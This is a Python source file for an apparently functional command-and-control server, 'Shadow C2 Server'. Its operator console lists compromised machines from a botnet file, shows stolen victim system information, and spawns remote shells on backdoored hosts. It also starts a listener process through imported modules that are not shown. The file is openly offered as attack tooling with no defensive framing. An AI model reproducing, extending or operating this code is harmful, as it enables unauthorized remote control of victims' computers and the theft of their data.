import sys
import os
import conhandler
import multiprocessing
from shellspawn import ShellSpawn
import json

object = conhandler.Handler()

class ServerBoot(): 
     
    def __init__(self): 
        self.PORT = 9999    # Enter your listener port here 
        self.BUFFER_SIZE = 2024 * 2024
        self.SEP = "<sep>"

    def local_commandlist(self): 
        print("""
        Load        Shows list of all active compromised systems

        Connect     Establishes a shell on a compromised system 

        Log         Shows all documented IP address connected to the server

        Clear       Clears the terminal 

        Help        Shows all commands 

        Quit        Shuts down entire C2 server 

        """) 

        self.shell() 

    def information_loader(self): 
        print("Loading all compromised systems...")
        print("--------------SHADOWAGENTS--------------") 
        with open("connections/botnet.txt", "r") as f: 
            for i in f: 
                print(i)
            
            sys_info = input("Do you want to load system information of a victim machine? [y/n]") 
            if sys_info.lower() == "y":
                ip_address = input("Enter IP address to begin reading system information: ")
                
                with open(f"database/{ip_address}_SYSINFO.json", "r") as j: 
                    data = json.loads(j.read())
                    print(json.dumps(data, indent=4)) 
                    self.shell() 
            else: 
                self.shell() 

    def loadfunction(self): # Function loads all the systems that has been compromised with backdoor.
        try:
            print("Loading all compromised systems...")
            print("--------------SHADOWAGENTS--------------") 
            with open("connections/botnet.txt", "r") as f: 
                for i in f: 
                    print(i) 
        
                usrin = input("<shadowshell> do you want to load a shell on a system? [y/n] ") 
                if usrin.lower() == 'y': 
                    load = input("<shadowshell> which host do you want to load into: ")
                    ShellSpawn.sleepercom(self, load) 
                else: 
                    self.shell()
        except: 
            pass 

        return 0; 

  

    def connection_log(self): 
        print("Printing all documented IP address...")
        with open("connections/connectionlist.txt", "r") as f: 
            for i in f: 
                print(i) 
        self.shell() 

    def shell(self): # Logic of the main C2 server (all commands)
        try: 
            action = input("<shadowshell> ") 
            action = action.strip()
            if action.lower() == 'load':
                self.information_loader()

            elif action.lower() == 'quit': 
                print("Shutting down shadow server") 
                sys.exit(0) 

            elif action.lower() == 'clear': 
                os.system("clear") 
                self.shell()
                
            elif action.lower() == 'help': 
                self.local_commandlist()  

            elif action.lower() == 'connect': 
                self.loadfunction() 

            elif action.lower() == 'log': 
                self.connection_log()

            else: 
                print(f"unknown command {action}") 
                self.shell() 

        except KeyboardInterrupt: 
            print("\nShutting down shadow server.") 
            sys.exit(0) 

        return 0; 


    
def main():  
    os.system("clear")
    print("""

     _____ _               _                 _____  _____   _____                          
    /  ___| |             | |               /  __ \/ __  \ /  ___|                         
    \ `--.| |__   __ _  __| | _____      __ | /  \/`' / /' \ `--.  ___ _ ____   _____ _ __ 
     `--. \ '_ \ / _` |/ _` |/ _ \ \ /\ / / | |      / /    `--. \/ _ \ '__\ \ / / _ \ '__|
    /\__/ / | | | (_| | (_| | (_) \ V  V /  | \__/\./ /___ /\__/ /  __/ |   \ V /  __/ |   
    \____/|_| |_|\__,_|\__,_|\___/ \_/\_/    \____/\_____/ \____/ \___|_|    \_/ \___|_|   

                    ______
                  .-"      "-.
                 /            
                |              |
                |,  .-.  .-.  ,|
           /\   | )(__/  \__)( |
         _ \/   |/     /\     \|
        \_\/    (_     ^^     _)   .-==/~
      ____/_,__,_\__|IIIIII|__/__)/   /{~}}
     -----,---,---|-\IIIIII/-|---,\'-' {{~}
                  \          /     '-==\}/
                   `--------`
                                                                                       
    Version 3.0.0 
    Created by ---> @whiteha0x07mania

    [~] "Abandon hope all ye who enter here"
    [~] "Everytime I close my eyes... All I see is just my eyelids." -- Wrench
    [~] "Gotta have tools with Acssi art that you'll cringe looking back years later." -- Anon
    
    """)

    serverboot = ServerBoot() 
    serverboot.shell()
    

def boot_menu(): 
    if os.path.exists("database/") == True: 
        None 
    else: 
        os.mkdir("database/")

    if os.path.exists("connections/") == True: 
        None 
    else: 
        os.mkdir("connections/") 

    if os.path.exists("connections/botnet.txt") == True: 
        None 
    else: 
        open("connections/botnet.txt", "x") 
    
    if os.path.exists("connections/connectionlist.txt") == True: 
        None 
    else: 
        open("connections/connectionlist.txt", "x") 
             
    if os.path.exists("logs") == True: 
        None 
    else: 
        os.mkdir("logs") 

    if os.path.exists("logs/activity_logs.txt") == True: 
        None 
    else: 
        open("logs/activity_logs.txt", "x") 


    main() 




if __name__ == "__main__": 
    serverboot = ServerBoot()   
    p2 = multiprocessing.Process(target=object.listener)
    p2.start()
    boot_menu()
